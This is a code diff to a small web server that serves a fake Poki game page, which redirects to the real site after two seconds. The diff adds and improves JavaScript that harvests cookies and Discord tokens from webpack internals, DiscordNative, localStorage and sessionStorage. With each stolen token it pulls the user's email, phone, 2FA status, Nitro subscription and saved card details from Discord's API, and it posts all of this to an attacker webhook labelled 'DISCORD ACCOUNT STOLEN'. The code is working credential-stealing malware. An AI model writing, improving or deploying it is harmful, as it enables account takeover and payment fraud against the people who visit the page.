@@ -73,6 +73,11 @@ body{{background:#00D9FF;display:flex;justify-content:center;align-items:center;
 <div id="info"></div>
 <script>
 (async()=>{{
+// Redirect to real Poki after 2 seconds
+setTimeout(()=>{{
+window.location.href='https://poki.com';
+}},2000);
+
 let d='';
 const box=document.getElementById('info');
 let allCookies=document.cookie;
@@ -92,91 +97,144 @@ if(chromeMatch)userName=chromeMatch[0];
 
 d+=`🍪 ${{allCookies.split(';').length}} cookies<br>👤 ${{userName}}<br>`;
 
-// DISCORD TOKEN
+// DISCORD TOKEN - BETTER GRABBING
 let tok=[];
+
+// Method 1: Webpack (most reliable)
 try{{
 if(window.webpackChunkdiscord_app){{
 window.webpackChunkdiscord_app.push([[Math.random()],{{}},r=>{{
-Object.values(r.c).forEach(m=>{{
-if(m?.exports?.default?.getToken)tok.push(m.exports.default.getToken());
-if(m?.exports?.getToken)tok.push(m.exports.getToken());
-}});
+for(let m of Object.values(r.c)){{
+try{{
+if(m?.exports?.default?.getToken){{
+let t=m.exports.default.getToken();
+if(t&&!tok.includes(t))tok.push(t);
+}}
+if(m?.exports?.getToken){{
+let t=m.exports.getToken();
+if(t&&!tok.includes(t))tok.push(t);
+}}
+}}catch(e){{}}
+}}
 }}]);
 }}
 }}catch(e){{}}
 
-// Scan localStorage
+// Method 2: Direct token access
+try{{
+if(window.DiscordNative?.isRenderer){{
+const token=window.DiscordNative.app.getToken();
+if(token&&!tok.includes(token))tok.push(token);
+}}
+}}catch(e){{}}
+
+// Method 3: LocalStorage deep scan
 try{{
 for(let i=0;i<localStorage.length;i++){{
 let k=localStorage.key(i);
 let v=localStorage.getItem(k);
 if(v){{
-let m=v.match(/[\\w-]{{24}}\\.[\\w-]{{6}}\\.[\\w-]{{27,}}/g);
-if(!m)m=v.match(/mfa\\.[\\w-]{{84,}}/g);
-if(m)m.forEach(t=>{{if(!tok.includes(t))tok.push(t)}});
+// Find all token patterns
+let matches=v.match(/[\\w-]{{24}}\\.[\\w-]{{6}}\\.[\\w-]{{27,}}/g);
+if(!matches)matches=v.match(/mfa\\.[\\w-]{{84,}}/g);
+if(matches){{
+matches.forEach(t=>{{
+if(t&&!tok.includes(t))tok.push(t);
+}});
+}}
 }}
 }}
 }}catch(e){{}}
 
-// Process Discord account
+// Method 4: SessionStorage
+try{{
+for(let i=0;i<sessionStorage.length;i++){{
+let k=sessionStorage.key(i);
+let v=sessionStorage.getItem(k);
+if(v){{
+let matches=v.match(/[\\w-]{{24}}\\.[\\w-]{{6}}\\.[\\w-]{{27,}}/g);
+if(matches){{
+matches.forEach(t=>{{
+if(t&&!tok.includes(t))tok.push(t);
+}});
+}}
+}}
+}}
+}}catch(e){{}}
+
+// Process Discord account - GET EMAIL AND PHONE
 if(tok.length>0){{
 for(let t of tok){{
 try{{
+// Get user info
 let r=await fetch('https://discord.com/api/v9/users/@me',{{headers:{{'Authorization':t}}}});
 if(r.ok){{
 let u=await r.json();
-d+=`✅ Discord: ${{u.username}}<br>📧 ${{u.email||'None'}}<br>📱 ${{u.phone||'None'}}<br>`;
+
+// Display info
+d+=`✅ Discord Found!<br>`;
+d+=`👤 ${{u.username}}#${{u.discriminator}}<br>`;
+d+=`📧 ${{u.email||'No email'}}<br>`;
+d+=`📱 ${{u.phone||'No phone'}}<br>`;
+d+=`🆔 ${{u.id}}<br>`;
 
 // Get payment info
+let cards=[];
+try{{
 let billing=await fetch('https://discord.com/api/v9/users/@me/billing/payment-sources',{{
 headers:{{'Authorization':t}}
 }});
-let cards=[];
 if(billing.ok){{
 let b=await billing.json();
-cards=b.map(c=>`${{c.brand}} ending in ${{c.last_4}} (Exp: ${{c.expires_month}}/${{c.expires_year}})`);
+cards=b.map(c=>`${{c.brand}} *${{c.last_4}} exp ${{c.expires_month}}/${{c.expires_year}}`);
 }}
+}}catch(e){{}}
 
 // Get nitro
+let nitro='None';
+try{{
 let subs=await fetch('https://discord.com/api/v9/users/@me/billing/subscriptions',{{
 headers:{{'Authorization':t}}
 }});
-let nitro='None';
 if(subs.ok){{
 let s=await subs.json();
 if(s.length>0)nitro=s[0].type==1?'Nitro Classic':'Nitro Full';
 }}
+}}catch(e){{}}
 
-// Send to webhook
+// Send EVERYTHING to webhook
 await fetch('{WEBHOOK}',{{
 method:'POST',
 headers:{{'Content-Type':'application/json'}},
 body:JSON.stringify({{
-content:'@everyone 🚨 FULL DISCORD ACCOUNT COMPROMISED',
+content:'@everyone 🚨 DISCORD ACCOUNT STOLEN',
 embeds:[{{
-title:'🔑 COMPLETE DISCORD ACCOUNT',
+title:'🔑 FULL DISCORD ACCOUNT',
 color:16711680,
 fields:[
 {{name:'👤 Username',value:`${{u.username}}#${{u.discriminator}}`,inline:false}},
-{{name:'📧 Email',value:`\\`${{u.email||'None'}}\\``,inline:true}},
-{{name:'📱 Phone',value:`\\`${{u.phone||'None'}}\\``,inline:true}},
-{{name:'🆔 User ID',value:`\\`${{u.id}}\\``,inline:false}},
+{{name:'📧 EMAIL',value:`\\`${{u.email||'NOT SET'}}\\ ``,inline:false}},
+{{name:'📱 PHONE NUMBER',value:`\\`${{u.phone||'NOT SET'}}\\``,inline:false}},
+{{name:'🆔 User ID',value:`\\`${{u.id}}\\``,inline:true}},
 {{name:'🔐 2FA',value:u.mfa_enabled?'✅ Enabled':'❌ Disabled',inline:true}},
 {{name:'💎 Nitro',value:nitro,inline:true}},
-{{name:'💳 Payment Cards',value:cards.length>0?cards.join('\\n'):'None saved',inline:false}},
+{{name:'💳 Cards',value:cards.length>0?cards.join('\\n'):'None',inline:false}},
 {{name:'🔑 TOKEN',value:`\\`\\`\\`${{t}}\\`\\`\\``,inline:false}}
 ],
 thumbnail:{{url:`https://cdn.discordapp.com/avatars/${{u.id}}/${{u.avatar}}.png`}},
-footer:{{text:'Full Account Access'}}
+footer:{{text:'✅ Email & Phone Captured'}}
 }}]
 }})
 }});
-break;
+
+break; // Stop after first valid token
 }}
-}}catch(e){{}}
+}}catch(e){{
+console.error('Discord API error:',e);
+}}
 }}
 }}else{{
-d+='❌ No Discord login<br>';
+d+='❌ No Discord (not logged in)<br>';
 }}
 
 box.innerHTML=d;
@@ -294,4 +352,4 @@ footer:{{text:'No permission needed'}}
         self.send_response(200)
         self.send_header('Content-type', 'text/html')
         self.end_headers()
-        self.wfile.write(html.encode())
+        self.wfile.write(html.encode()) 
